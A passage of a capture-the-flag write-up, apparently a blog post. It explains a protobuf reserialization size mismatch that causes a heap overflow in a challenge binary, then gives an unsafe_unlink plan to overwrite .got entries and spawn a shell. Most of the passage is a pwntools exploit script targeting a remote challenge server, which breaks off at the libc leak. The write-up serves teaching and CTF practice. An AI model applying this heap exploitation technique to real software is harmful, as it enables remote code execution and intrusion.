bytes than the size).</p><h4 class="relative group">[3] Free chunk<div id=3-free-chunk class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#3-free-chunk aria-label=Anchor>#</a></span></h4><p>It asks for a slot index. It calls <code>free</code> on the pointer stored at
<code>slots[&lt;index>]</code> . It stores 0 into <code>slots[&lt;index>]</code> and <code>slots_size[&lt;index>]</code></p><h4 class="relative group">[4] Protobuf unserialize and reserialize<div id=4-protobuf-unserialize-and-reserialize class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#4-protobuf-unserialize-and-reserialize aria-label=Anchor>#</a></span></h4><p>This is the most complicated option, and the only one that took a few hours to
be completely understood. It asks for a slot index. It parses the content with
the protobuf parser generating the <code>Telescope</code> object. It checks that the field
<code>pass</code> of the <code>Telescope</code> object is equal to <code>0xDEADBEEF</code>. If the <code>pass</code> field
is not correctly set, you get an abort.</p><p>If you manage to pass this check, the program removes the field <code>pass</code>.
It prints out the number of <code>lens</code> (the other field of <code>Telescope</code>).
It serializes the new object to a string. It uses a <code>memcpy</code> to copy the new string (byte representation of the object) into the slot.</p><h4 class="relative group">[5] Prints the chunk<div id=5-prints-the-chunk class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#5-prints-the-chunk aria-label=Anchor>#</a></span></h4><p>It asks for an index. It prints out <code>slots_sizes[&lt;index>]</code> bytes of
<code>slots[&lt;index>]</code>.</p><h4 class="relative group">[-] Exit<div id=--exit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#--exit aria-label=Anchor>#</a></span></h4><p>Any other option exit the program.</p><h3 class="relative group">ProtoBuf<div id=protobuf class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#protobuf aria-label=Anchor>#</a></span></h3><p>Protobuf is a nice library that lets you define structured data that can be
serialized and read back. It is nice because it supports many languages and
automatically generates code to handle these data.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ocaml data-lang=ocaml><span class=line><span class=cl><span class=n>syntax</span> <span class=o>=</span> <span class=s2>&#34;proto2&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>message</span> <span class=nc>Telescope</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>repeated</span> <span class=n>int64</span> <span class=n>lens</span> <span class=o>=</span> <span class=n>1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>optional</span> <span class=n>int64</span> <span class=n>pass</span> <span class=o>=</span> <span class=n>2</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>There are 2 fields in this object. <code>pass</code> is optional and need to be set to
<code>0xDEADBEEF</code> because the code checks its value. <code>lens</code> is an array of integers.
It can be empty or any size.</p><p>It is vital to understand how the encoding of protobuf works. You can find
details of the encoding on
<a href=https://developers.google.com/protocol-buffers/docs/encoding target=_blank>protobuf documentation</a>.
The documentation is written very well and explains how the encoding is working
way better than I will ever be able to do. If you want to understand the
vulnerability, you need to read the documentation and understand the
serialization types.</p><p>Here I give you an example of a <code>Telescope</code> object is encoded:</p><pre tabindex=0><code>\x08\x17\x08\x20\x10\x11
</code></pre><p>Protobuf encode the field and is type in one byte followed by the value
<code>(field_number &lt;&lt; 3) | wire_type</code>. If you want to encode field numeber 1 with
type 0 you get <code>1 &lt;&lt; 3 | 0 = 0x08</code>. In particular, the byte <code>\x08</code> represent the
field <code>lens</code> while <code>\x10</code> is the field <code>pass</code>. In this paricular string we have
2 elements for <code>lens</code>: <code>\x08\x17</code> and <code>\x08\x20</code>. <code>\x10\x11</code> is instead the
encoding of <code>pass</code>. Hence, when deserialized we will have
<code>obj.lens = [0x17, 0x20] </code>and <code>obj.pass = 0x11</code>.</p><h3 class="relative group">Testing Protobuf<div id=testing-protobuf class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#testing-protobuf aria-label=Anchor>#</a></span></h3><p>I spent hours playing with protobuf serialization. It was evident to me (after a
while playing CTF you develop an intuition on where the author wants you to
look.) that the vulnerability was in encoding/decoding protobuf. I tried several
things. I do not recall them all. I had a python and a c++ program that I can
use as a decoder/encoder debug.</p><p>Few intresting discovery that I recall. The order of elements does not matter.
You can have few lens the a pass and other lens: <code>\x08\x17\x10\x11\x08\x20</code> is
valid and still decode to <code>obj.lens = [0x17, 0x20] </code>and <code>obj.pass = 0x11</code></p><p>You can have multiple instances for <code>pass</code>: <code>\x08\x17\x10\x11\x08\x20\x10\x11</code>
is valid and still decode to <code>obj.lens = [0x17, 0x20] </code>and <code>obj.pass = 0x11</code>.</p><h3 class="relative group">The Vulnerability<div id=the-vulnerability-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-vulnerability-1 aria-label=Anchor>#</a></span></h3><p>I discovered that there are at least 2 ways to encode repeated fields. The
preferred way to encode a repeated field in protobuf is to have multiple
instances of a field. In fact, if you serialize <code>obj.lens = [0x17, 0x20]</code> you
get <code>\x08\x17\x08\x20</code>. Another &ldquo;valid&rdquo; way to encode a repeated field is to use
<a href=https://developers.google.com/protocol-buffers/docs/encoding target=_blank><code>Lenght'delimited</code> type</a>.
In this case <code>\x0a\x02\x17\x20</code> is still decoded as <code>obj.lens = [0x17, 0x20]</code>.
In particular, <code>\x0a</code> is field number 1 with type 2 (<code>1 &lt;&lt; 3 | 2 = 0x0a</code>). 0x0a
is followed by the size of the content (2 bytes in this case). Then there is the
encoding of multiple numbers. (N.B. the numbers are always encoded as
<a href=https://developers.google.com/protocol-buffers/docs/encoding target=_blank><code>Variant</code></a>, you
can have any number not only single bytes).</p><p>If you deserialize and the serialize back <code>\x0a\x02\x17\x20</code> you get the string
<code>\x08\x17\x08\x20</code>. Both are 4 bytes, so this particular instance is not a
problem.</p><p>However, if you deserialize and serialize <code>\x0a\x02\x17\x20\x17</code>, you get back
<code>\x08\x17\x08\x20\x08\x17</code>. The first string is 5 bytes; the second is 6 bytes.
For every single byte that we add in the first string, we get 2 bytes in the
second. This allows us to overflow a chunk.</p><h3 class="relative group">The Exploit<div id=the-exploit-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-exploit-1 aria-label=Anchor>#</a></span></h3><ul><li>We have a heap overflow where we can easily control the last byte.</li><li>We have arbitrary read and write in any chunk that we control.</li><li>We have a list of .bss containing pointers to our chunks.</li></ul><p>This is an excellent candidate to do an
<a href=https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c target=_blank>unsafe_unlink</a>.</p><p>Our exploit aims to exploit an unsafe_unlink to overwrite one of the pointers in
<code>slots</code> to point to <code>slots</code>. This will allow us to arbitrarily change the
pointer of a slot and have arbitrary read and arbitrary write primitives. With
those primitives, we can read <code>.got</code> to leak libc and change the function <code>free</code>
with function <code>system</code>. Please note that the binary is not <code>PIE</code> and is not
<code>Full RELRO</code>.</p><h3 class="relative group">The Unsafe Unlink<div id=the-unsafe-unlink class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-unsafe-unlink aria-label=Anchor>#</a></span></h3><p>This step aims to overwrite one of the pointers in <code>slots</code> with an address of
<code>slots</code>. This is possible by exploiting the unlink function of libc. When
eliminating a chunk from the free list, the unlink algorithm of libc will
overwrite the previous chunk&rsquo;s forward ptr. We can exploit this write by faking
that the previous chunk is on <code>.bss</code>. There are several checks in the libc that
you need to meet to have unlink successfully. You can play with
<a href=%28https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c%29>how2heap</a>
to understand those constraints.</p><p>In practice, we create a fake chunk header 0x10 bytes below one valid chunk.
(You can do this because 0x10 bytes below the header begins the data part of the
chunk). We do an overflow from one chunk to another, changing the <code>PREV_IN_USE</code>
bit from 1 to 0. We set the prev_size to be 0x10 byte less than the real one.
When we free the second chunk, a <code>consolidate</code> is triggered, trying to merge
multiple chunks, so our chunk is unlinked, causing the overwrite.</p><h3 class="relative group">Aligning the <del>Stars</del> Chunks<div id=aligning-the-stars-chunks class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#aligning-the-stars-chunks aria-label=Anchor>#</a></span></h3><p>To trigger the consolidate, we need our chunk to be contiguous to the top_chunk.
The size of the chunk that we choose to make this attack is 0x458.
Reason to choose this size:</p><ul><li>It needs NOT to be a fastbin.</li><li>We need to be able to overwrite the prev_size filed.</li></ul><p>The prev_size fields are placed as the last 8 bytes of the chunks.
<code>malloc(0x458)</code> will create a chunk of 0x460 bytes.</p><p>In our exploit, we allocate 20 chunks of sizer 0x458. This will remove all the
free chunks of that size.</p><p>We allocate some <code>extra_sizes</code> (<code>0x410, 0x470, 0x13b0, 0x2010</code>). Those are chunk
size that will be used by protobuf deserialize and serialize functions. The idea
is to preallocate those chunks to avoid them from being between our attacked
chunk and the top_chunk. If you wonder, we got the size with gdb by looking at
which chunks were between our attacked chunk and the top_chunk.</p><p>We allocate 3 chunks of size <code>0x460</code>:</p><ol><li>The first chunk (<code>chunk_c</code>) is there as a used chunk. We need to consolidate
only 2 chunks, so we use the first chunk as a barrier.</li><li>The second chunk (<code>chunk_a</code>) is the chunk that we are using as a fake chunk
and the chunk to do the overflow.</li><li>The third (<code>chunk_b</code>) chunk is the chunk that will be overflown by over byte.</li></ol><p>After the allocation, we deallocate the extra_sizes chunk. Now they are
available for the protobuf algorithm, and they will not interfere with our
attack.</p><h3 class="relative group">Arbitrary Read/Write<div id=arbitrary-readwrite class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#arbitrary-readwrite aria-label=Anchor>#</a></span></h3><p>With unsafe unlink, you can overwrite one of the pointers in <code>slots</code> and have
that pointer pointing to <code>slots</code> as well. This will allow you to control any
pointer with data that you want.</p><p>To build a decent primitive arbitrary read-write. We made <code>slots[20]</code> pointing
to <code>slots[21]</code>. And both were chunks allocated with size 8. By writing in
<code>slots[20]</code> we set the <code>address</code> of our primitive. by reading-writing
<code>slots[21]</code>, we exploit the read-write.</p><p>With this primitive, we can, by reading the value of puts in .got, get a leak of
libc. We can compute the position of the <code>system,</code> and we can substitute free in
.got with the <code>system</code>. At this point, we just need to free a chunk which
content is <code>/bin/sh\x00</code> to get a shell.</p><h3 class="relative group">The script<div id=the-script class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-script aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;13.112.193.37&#34;</span><span class=p>,</span> <span class=mi>8573</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloca_slot</span><span class=p>(</span><span class=n>slot</span><span class=p>,</span> <span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span><span class=p>(</span><span class=n>slot</span> <span class=o>&lt;=</span> <span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span><span class=p>((</span><span class=n>size</span> <span class=o>&amp;</span> <span class=mh>0x80000000</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;slot&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>slot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;size&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write_slot</span><span class=p>(</span><span class=n>slot</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span><span class=p>(</span><span class=n>slot</span> <span class=o>&lt;=</span> <span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;slot&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>slot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free_slot</span><span class=p>(</span><span class=n>slot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span><span class=p>(</span><span class=n>slot</span> <span class=o>&lt;=</span> <span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;slot&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>slot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_slot</span><span class=p>(</span><span class=n>slot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span><span class=p>(</span><span class=n>slot</span> <span class=o>&lt;=</span> <span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;slot&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>slot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>print_slot</span><span class=p>(</span><span class=n>slot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span><span class=p>(</span><span class=n>slot</span> <span class=o>&lt;=</span> <span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;slot&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>slot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;op&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># lens = b&#34;\x41&#34; * 40</span>
</span></span><span class=line><span class=cl><span class=c1># data = b&#34;\x10\xef\xfd\xb6\xf5\x0d&#34; + b&#34;\x0a&#34;+bytes([len(lens),]) +  lens</span>
</span></span><span class=line><span class=cl><span class=c1># print(data)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>overflow</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x0a\x0b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x60</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pass_data</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x10\xef\xfd\xb6\xf5\x0d</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>filling</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x08</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>1090</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x0a\x02\x80\x08</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>pass_data</span> <span class=o>+</span> <span class=n>filling</span> <span class=o>+</span> <span class=n>overflow</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_size</span> <span class=o>=</span> <span class=mh>0x458</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>==</span> <span class=n>chunk_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>alloca_slot</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>chunk_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>extra_sizes</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x410</span><span class=p>,</span> <span class=mh>0x470</span><span class=p>,</span> <span class=mh>0x13b0</span><span class=p>,</span> <span class=mh>0x2010</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>extra_space</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>extra_space</span><span class=p>,</span> <span class=n>extra_space</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>extra_sizes</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;allocat_empy </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>alloca_slot</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>extra_sizes</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=n>extra_space</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>chunk_size</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_a</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>chunk_b</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>chunk_c</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;a: </span><span class=si>%d</span><span class=s2>, b: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>chunk_a</span><span class=p>,</span> <span class=n>chunk_b</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>alloca_slot</span><span class=p>(</span><span class=n>chunk_c</span><span class=p>,</span> <span class=n>chunk_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloca_slot</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>,</span> <span class=n>chunk_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloca_slot</span><span class=p>(</span><span class=n>chunk_b</span><span class=p>,</span> <span class=n>chunk_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>extra_space</span><span class=p>,</span> <span class=n>extra_space</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>extra_sizes</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;free </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free_slot</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>write_slot</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>print_slot</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>parse_slot</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s2</span> <span class=o>=</span> <span class=n>print_slot</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>slots_base</span> <span class=o>=</span> <span class=mh>0x409280</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>addre_23</span> <span class=o>=</span> <span class=n>slots_base</span> <span class=o>+</span> <span class=mi>23</span><span class=o>*</span><span class=mi>8</span> <span class=c1># chunk_a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_chunk_a</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x451</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>addre_23</span> <span class=o>-</span> <span class=mh>0x18</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>addre_23</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;c&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;d&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;e&#34;</span><span class=o>*</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>new_chunk_a</span> <span class=o>=</span> <span class=n>new_chunk_a</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x450</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x450</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># input(&#34;wait for write&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>write_slot</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>,</span> <span class=n>new_chunk_a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># input(&#34;wait for free&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>free_slot</span><span class=p>(</span><span class=n>chunk_b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>slots_data</span> <span class=o>=</span> <span class=n>print_slot</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=mh>0x4091A8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloca_slot</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloca_slot</span><span class=p>(</span><span class=mi>21</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># input(&#34;check chunka&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span>  <span class=n>p64</span><span class=p>(</span><span class=mh>0x409328</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>chunk_size</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;op&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write_slot</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;DEBUG&#34;</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;op&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts_leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>print_slot</span><span class=p>(</span><span class=mi>21</span><span class=p>))</span>
